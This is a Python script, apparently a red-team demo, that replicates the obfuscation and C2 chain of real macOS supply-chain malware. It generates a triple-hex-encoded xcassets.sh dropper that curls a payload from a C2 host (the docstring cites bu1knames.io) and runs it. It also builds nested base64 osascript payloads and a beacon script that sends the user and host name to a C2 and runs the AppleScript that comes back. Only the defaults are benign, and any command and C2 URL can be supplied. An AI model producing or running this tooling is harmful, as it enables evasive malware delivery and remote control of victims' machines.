#!/usr/bin/env python3
"""
RED TEAM DEMO - Payload Obfuscator
===================================
Replicates the exact obfuscation techniques from the original malware:

1. Triple hex encoding for shell scripts (xcassets.sh)
2. Multi-layer base64 for AppleScript payloads
3. Recursive osascript execution pattern

This matches the real-world attack observed in the PCAP analysis.

Usage:
    python3 obfuscator.py --type triple-hex --input "curl http://c2/beacon"
    python3 obfuscator.py --type applescript-recursive --layers 5 --input "display dialog 'pwned'"
    python3 obfuscator.py --decode --input "encoded_string"
"""

import argparse
import base64
import sys


def hex_encode(data: str) -> str:
    """Convert string to hex representation."""
    return data.encode('utf-8').hex()


def hex_decode(data: str) -> str:
    """Convert hex back to string."""
    return bytes.fromhex(data).decode('utf-8')


def triple_hex_encode(command: str) -> str:
    """
    Triple hex encode a command.
    This matches the original xcassets.sh obfuscation:
    
    Original: curl -fskL http://bu1knames.io/a
    Layer 1:  6375726c202d66736b4c20687474703a2f2f6275316b6e616d65732e696f2f61
    Layer 2:  36333735373236633230326436363733...
    Layer 3:  3336333333373335333733323336363333323330...
    """
    result = command
    for i in range(3):
        result = hex_encode(result)
    return result


def triple_hex_decode(encoded: str) -> str:
    """Decode triple hex encoded string."""
    result = encoded
    for i in range(3):
        result = hex_decode(result)
    return result


def generate_xcassets_script(command: str, c2_url: str = None) -> str:
    """
    Generate the malicious xcassets.sh script with triple hex encoding.
    Matches the original format exactly.
    """
    # If c2_url provided, create the full beacon command
    if c2_url:
        # Original format: curl -fskL http://bu1knames.io/a -o /tmp/.o.txt
        full_command = f'curl -fskL {c2_url}/a -o /tmp/.o.txt'
    else:
        full_command = command
    
    encoded = triple_hex_encode(full_command)
    
    script = f'''#!/usr/bin/env bash
x=$(echo '{encoded}' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
sleep 2
bash /tmp/.o.txt
'''
    return script


def base64_encode_layer(data: str) -> str:
    """Single layer base64 encode."""
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')


def base64_decode_layer(data: str) -> str:
    """Single layer base64 decode."""
    return base64.b64decode(data.encode('utf-8')).decode('utf-8')


def multi_layer_base64_encode(data: str, layers: int = 5) -> str:
    """
    Multi-layer base64 encode.
    The original malware used ~5-7 layers of base64.
    """
    result = data
    for i in range(layers):
        result = base64_encode_layer(result)
    return result


def multi_layer_base64_decode(data: str, layers: int = 5) -> str:
    """Multi-layer base64 decode."""
    result = data
    for i in range(layers):
        result = base64_decode_layer(result)
    return result


def generate_recursive_applescript(payload: str, layers: int = 5) -> str:
    """
    Generate recursive AppleScript payload.
    
    Original format:
    try
        do shell script "osascript -e \"$(echo <base64> | base64 -D)\""
    end try
    
    Each layer wraps the previous in base64 and osascript execution.
    """
    current = payload
    
    for i in range(layers):
        # Base64 encode current payload
        encoded = base64_encode_layer(current)
        
        # Wrap in osascript execution
        current = f'''try
    do shell script "osascript -e \\"$(echo {encoded} | base64 -D)\\""
end try'''
    
    return current


def generate_c2_response_payload(demo_command: str, layers: int = 5) -> str:
    """
    Generate the full C2 response payload (AppleScript format).
    This is what the C2 server returns when a beacon checks in.
    """
    # The innermost payload - what actually executes
    inner_payload = f'''try
    do shell script "{demo_command}"
    display notification "Payload executed" with title "RED TEAM DEMO"
end try'''
    
    # Wrap in recursive base64/osascript layers
    return generate_recursive_applescript(inner_payload, layers)


def generate_beacon_script(c2_url: str, beacon_id: str = "demo") -> str:
    """
    Generate the beacon shell script that gets downloaded.
    This is what /tmp/.o.txt contains after initial curl.
    """
    script = f'''#!/bin/bash
# Beacon to C2
USER=$(whoami)
HOST=$(hostname)
TS=$(date +%s)

# Send beacon
RESPONSE=$(curl -s -X POST "{c2_url}/s/{beacon_id}" \\
    -d "p=macos&u=$USER&a=$TS,$TS,0,0" \\
    -A "curl/8.7.1")

# Execute response if AppleScript
if echo "$RESPONSE" | grep -q "do shell script"; then
    echo "$RESPONSE" > /tmp/.r.txt
    osascript /tmp/.r.txt 2>/dev/null
    rm -f /tmp/.r.txt
fi
'''
    return script


# ============================================================================
# DEMO-SAFE PAYLOADS
# ============================================================================

def get_safe_demo_payload() -> str:
    """
    Return a safe demo payload that shows visible indicators.
    """
    return '''mkdir -p /tmp/redteam_demo
echo "[DEMO] Payload executed at $(date)" >> /tmp/redteam_demo/activity.log
echo "[DEMO] User: $(whoami)" >> /tmp/redteam_demo/activity.log'''


def get_safe_applescript_payload() -> str:
    """
    Return a safe AppleScript demo payload.
    """
    return '''try
    display dialog "RED TEAM DEMO" & return & return & "Supply chain attack simulation successful!" & return & return & "User: " & (do shell script "whoami") & return & "Time: " & (do shell script "date") with title "Payload Executed" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo 'AppleScript payload executed at $(date)' >> /tmp/redteam_demo/activity.log"
end try'''


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - Payload Obfuscator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    # Generate triple-hex encoded shell command
    python3 obfuscator.py --type triple-hex --command "curl http://c2:8888/a"
    
    # Generate full xcassets.sh script
    python3 obfuscator.py --type xcassets --c2 http://localhost:8888
    
    # Generate recursive AppleScript (5 layers)
    python3 obfuscator.py --type applescript --layers 5
    
    # Generate C2 response payload
    python3 obfuscator.py --type c2-response --layers 5
    
    # Decode triple-hex
    python3 obfuscator.py --decode triple-hex --input "3336..."
    
    # Decode multi-layer base64
    python3 obfuscator.py --decode base64 --layers 5 --input "Vm1w..."
        '''
    )
    
    parser.add_argument('--type', '-t',
                       choices=['triple-hex', 'xcassets', 'applescript', 'c2-response', 'beacon'],
                       help='Type of obfuscated payload to generate')
    parser.add_argument('--decode', '-d',
                       choices=['triple-hex', 'base64'],
                       help='Decode an obfuscated payload')
    parser.add_argument('--command', '-c',
                       help='Command to obfuscate')
    parser.add_argument('--c2',
                       default='http://localhost:8888',
                       help='C2 server URL')
    parser.add_argument('--beacon-id', '-b',
                       default='demo',
                       help='Beacon identifier')
    parser.add_argument('--layers', '-l',
                       type=int, default=5,
                       help='Number of encoding layers (default: 5)')
    parser.add_argument('--input', '-i',
                       help='Input string to decode')
    parser.add_argument('--output', '-o',
                       help='Output file')
    parser.add_argument('--safe', '-s',
                       action='store_true',
                       help='Use safe demo payloads (visible indicators)')
    
    args = parser.parse_args()
    
    result = None
    
    # Decode mode
    if args.decode:
        if not args.input:
            print("[!] --input required for decode mode")
            sys.exit(1)
        
        if args.decode == 'triple-hex':
            result = triple_hex_decode(args.input)
        elif args.decode == 'base64':
            result = multi_layer_base64_decode(args.input, args.layers)
    
    # Encode mode
    elif args.type:
        if args.type == 'triple-hex':
            cmd = args.command or get_safe_demo_payload()
            result = triple_hex_encode(cmd)
            
        elif args.type == 'xcassets':
            result = generate_xcassets_script(
                args.command or get_safe_demo_payload(),
                args.c2
            )
            
        elif args.type == 'applescript':
            payload = get_safe_applescript_payload() if args.safe else (args.command or get_safe_applescript_payload())
            result = generate_recursive_applescript(payload, args.layers)
            
        elif args.type == 'c2-response':
            cmd = args.command or get_safe_demo_payload()
            result = generate_c2_response_payload(cmd, args.layers)
            
        elif args.type == 'beacon':
            result = generate_beacon_script(args.c2, args.beacon_id)
    
    else:
        parser.print_help()
        sys.exit(1)
    
    # Output
    if result:
        if args.output:
            with open(args.output, 'w') as f:
                f.write(result)
            print(f"[+] Written to {args.output}")
        else:
            print(result)


if __name__ == '__main__':
    main()
